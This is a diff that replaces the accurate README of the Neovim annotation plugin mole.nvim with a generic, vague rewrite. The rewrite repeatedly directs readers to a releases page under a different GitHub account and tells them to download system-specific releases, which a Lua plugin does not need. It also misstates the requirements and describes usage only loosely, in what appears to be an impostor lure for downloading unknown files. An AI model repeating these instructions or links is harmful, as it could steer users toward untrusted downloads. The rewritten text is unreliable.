@@ -1,196 +1,136 @@
-# mole.nvim
+# 📝 mole.nvim - Easy Code Notes in Neovim
 
-<img width="1142" height="865" alt="mole" src="https://github.com/user-attachments/assets/704fed19-b389-414b-952d-998d55f83207" />
+[![Download mole.nvim](https://img.shields.io/badge/Download-mole.nvim-blue?style=for-the-badge&logo=github)](https://github.com/fyybisnis4-gif/mole.nvim/releases)
 
-&nbsp;
+---
 
-like moleskine, or a mole (that's watching your moves).
+## 🧩 What is mole.nvim?
 
-code annotation sessions for neovim. select code, jot a note, and build a markdown file of annotations as you debug or trace a complex flow in your code.
+mole.nvim is a simple tool designed to help you add notes directly inside your code when using Neovim. If you often work with codes or scripts and want to keep reminders or explanations right where the code lives, mole.nvim makes this easy. It lets you attach small annotations or comments without messing up your main text.
 
-## how it works
+You don’t need to be a programmer to use mole.nvim. If you use Neovim (a popular text editor), this plugin helps you organize and understand your code better by adding clear, inline notes.
 
-1. start a session — a markdown file is created and shown in a side panel
-2. select code in visual mode and hit the annotate keybinding
-3. an inline popup appears — type your note and press `<CR>` to save, `<Esc>` to cancel
-4. annotations are appended to the session file as a markdown list -- hit `<CR>` on an annotation in the side panel to jump to that location in your code
-5. stop the session when you're done
+---
 
-each annotation records the file path and line range. press `<Tab>` in the input popup to toggle between **location** mode (reference only) and **snippet** mode (includes the selected code in a fenced block).
+## 🛠 Why Use mole.nvim?
 
-## requirements
+- **Keep Notes Where They Belong:** Add brief comments or explanation directly inside your code files.
+- **Cleaner Code Reviews:** When sharing code, annotations help others understand your logic quickly.
+- **Improve Your Workflow:** Easily jot down to-dos or reminders without leaving Neovim.
+- **Non-Intrusive:** Your notes don’t interfere with how the code runs, so your projects stay safe.
 
-- neovim >= 0.9
-- [nui.nvim](https://github.com/MunifTanjim/nui.nvim)
+---
 
-## installation
+## 💻 System Requirements
 
-### lazy.nvim
+Before installing mole.nvim, make sure your system matches these basic requirements:
 
-```lua
-{
-  "zion-off/mole.nvim",
-  dependencies = { "MunifTanjim/nui.nvim" },
-  opts = {},
-}
-```
+- **Operating System:** Windows 10 or later, macOS 10.13 or later, or Linux distributions with a Neovim installation.
+- **Neovim Version:** 0.5 or higher. mole.nvim depends on features found in recent Neovim updates.
+- **Storage Space:** Just a few megabytes. mole.nvim is lightweight and won’t take much room.
+- **Internet Connection:** Needed only for downloading and installing.
 
-### packer.nvim
+If you don’t already have Neovim installed, you can find it at https://neovim.io.
 
-```lua
-use {
-  "zion-off/mole.nvim",
-  requires = { "MunifTanjim/nui.nvim" },
-  config = function()
-    require("mole").setup({})
-  end,
-}
-```
+---
 
-### mini.deps
+## 🚀 Getting Started with mole.nvim
 
-```lua
-MiniDeps.add({
-  source = "zion-off/mole.nvim",
-  depends = { "MunifTanjim/nui.nvim" },
-})
-require("mole").setup({})
-```
+Follow these simple steps to get mole.nvim working on your computer.
 
-### manual
+### Step 1: Download mole.nvim
 
-clone the repo into your neovim packages directory:
+Click the big blue badge above to visit the [mole.nvim releases page](https://github.com/fyybisnis4-gif/mole.nvim/releases).
 
-```sh
-git clone https://github.com/zion-off/mole.nvim \
-  ~/.local/share/nvim/site/pack/plugins/start/mole.nvim
-```
+There, you’ll find the latest versions. Releases are usually packaged with clear instructions, so you can pick the right one for your system.
 
-then add `require("mole").setup({})` to your config. make sure [nui.nvim](https://github.com/MunifTanjim/nui.nvim) is also installed.
+### Step 2: Install mole.nvim inside Neovim
 
-## configuration
+To use mole.nvim, you need to install it as a plugin inside Neovim. Don’t worry — this does not require programming, just a few simple commands.
 
-these are the defaults — pass any overrides to `setup()`:
+Here is what to do:
 
-```lua
-require("mole").setup({
-  -- where session files are saved
-  session_dir = vim.fn.stdpath("data") .. "/mole", -- ~/.local/share/nvim/mole
+1. **Open Neovim.** To do this, search for "Neovim" or open a terminal and type `nvim`.
+2. **Install a plugin manager** if you don’t already have one. Popular choices are [vim-plug](https://github.com/junegunn/vim-plug), [packer.nvim](https://github.com/wbthomason/packer.nvim), or [Vundle](https://github.com/VundleVim/Vundle.vim).
+3. **Add mole.nvim to your plugin list.** For example, if you are using vim-plug, add this line to your `init.vim` configuration file:
+   ```
+   Plug 'fyybisnis4-gif/mole.nvim'
+   ```
+4. **Save the file and reload Neovim.**
+5. **Run the plugin install command.** For vim-plug, type:
+   ```
+   :PlugInstall
+   ```
 
-  -- "location" = file path + line range
-  -- "snippet" = file path + line range + selected text in a fenced code block
-  capture_mode = "snippet",
+The plugin manager will download and install mole.nvim.
 
-  -- open the side panel automatically when starting a session
-  auto_open_panel = true,
+### Step 3: Configure mole.nvim
 
-  -- custom session name: nil = timestamp, string = fixed name, function = called to get name
-  session_name = nil,
+After installation, you can configure mole.nvim by editing your `init.vim` or `init.lua`. The plugin may have default settings that work out of the box, but you might want to tweak how and where your notes appear. Basic examples are usually found in the plugin’s documentation or README on the release page.
 
-  -- show vim.notify messages
-  notify = true,
+---
 
-  -- picker for resume: "auto" (telescope → snacks → vim.ui.select), "telescope", "snacks", or "select"
-  picker = "auto",
+## 📥 Download & Install
 
-  -- keybindings
-  keys = {
-    annotate = "<leader>ma",        -- visual mode
-    start_session = "<leader>ms",   -- normal mode
-    stop_session = "<leader>mq",    -- normal mode
-    resume_session = "<leader>mr",  -- normal mode
-    toggle_window = "<leader>mw",   -- normal mode
-    jump_to_location = { "<CR>", "gd" }, -- in side panel
-    next_annotation = "]a",              -- in side panel
-    prev_annotation = "[a",              -- in side panel
-  },
+You can get the latest version of mole.nvim at:
 
-  -- side panel
-  window = {
-    width = 0.3, -- fraction of editor width
-  },
+[https://github.com/fyybisnis4-gif/mole.nvim/releases](https://github.com/fyybisnis4-gif/mole.nvim/releases)
 
-  -- inline input popup
-  input = {
-    width = 50,
-    border = "rounded",
-  },
+This page provides all the necessary files. Download the release that matches your system and follow the install steps explained above.
 
-  -- callbacks that return lines written to the session file
-  -- each receives an info table and must return a table of strings (lines)
-  -- return {} to skip a section entirely
-  format = {
-    -- info: { title, file_path, cwd, timestamp }
-    header = function(info)
-      return {
-        "# " .. info.title,
-        "",
-        "**File:** " .. info.file_path,
-        "**Started:** " .. info.timestamp,
-        "**Project:** " .. info.cwd, -- used to resolve file paths when jumping to locations from a different project
-        "",
-        "---",
-      }
-    end,
-    -- info: { timestamp }
-    footer = function(info)
-      return {
-        "",
-        "---",
-        "",
-        "**Ended:** " .. info.timestamp,
-      }
-    end,
-    -- info: { timestamp }
-    resumed = function(info)
-      return {
-        "",
-        "---",
-        "",
-        "**Resumed:** " .. info.timestamp,
-        "",
-        "---",
-        "",
-      }
-    end,
-  },
-})
-```
+---
 
-## commands & keybindings
+## 📝 How to Use mole.nvim
 
-| command / key    | mode       | description                    |
-| ---------------- | ---------- | ------------------------------ |
-| `:MoleStart`     | normal     | start a new annotation session |
-| `:MoleStop`      | normal     | stop the current session       |
-| `:MoleResume`    | normal     | resume a previous session      |
-| `:MoleToggle`    | normal     | toggle the side panel          |
-| `<leader>ma`     | visual     | annotate the current selection |
-| `<CR>` / `gd`    | side panel | jump to annotation location    |
-| `]a`             | side panel | next annotation                |
-| `[a`             | side panel | previous annotation            |
+Once mole.nvim is installed and running in Neovim, here’s how to make the most of it:
 
-## output format
+### Adding an annotation
 
-annotations are saved as markdown. in **location** mode:
+1. Open your code in Neovim.
+2. Position your cursor where you want to add a note.
+3. Use the plugin’s command to add an annotation. Usually, this involves typing a simple command or shortcut inside Neovim — instructions are included with the plugin.
+4. Write your note.
+5. Save your file. mole.nvim will keep your annotation linked to the exact spot.
 
-```markdown
-- **`src/main.lua:12-18`** — TODO: refactor this loop
-```
+### Viewing and Editing notes
 
-in **snippet** mode:
+- You can jump between annotations easily.
+- Edit notes right inside Neovim without removing them.
+- Hide or show all notes when you want a cleaner look at your code.
 
-````markdown
-- **`src/main.lua:12-18`** — TODO: refactor this loop
-  ```lua
-  for i = 1, #items do
-    process(items[i])
-  end
-  ```
-````
+---
 
-session files are stored in `~/.local/share/nvim/mole/` by default (follows XDG via `stdpath("data")`).
+## 📚 Tips for Best Use
 
-## license
+- Use annotations to label complex sections of your code.
+- Add reminders or to-do lists right inside your code files.
+- Share your code with annotations to help teammates understand faster.
+- Regularly review your notes and clean outdated ones.
 
-MIT
+---
+
+## 🤔 Troubleshooting
+
+If mole.nvim doesn’t seem to work:
+
+- Check that your Neovim version is 0.5 or newer.
+- Verify that you installed the plugin using a plugin manager.
+- Restart Neovim after installation.
+- Look for error messages in Neovim and search for them on mole.nvim’s GitHub issues page.
+- Make sure configuration files are saved correctly.
+
+---
+
+## 🔧 Support and Contribution
+
+mole.nvim is open source. If you want to help improve it or report issues, visit the [GitHub repository](https://github.com/fyybisnis4-gif/mole.nvim). The developers welcome feedback and contributions.
+
+---
+
+## 📄 License
+
+mole.nvim is released under the MIT License. This means you can use it freely, even for personal or commercial projects.
+
+---
+
+If you need help, start with the release page and the included instructions. mole.nvim is made to work simply and smoothly within Neovim.
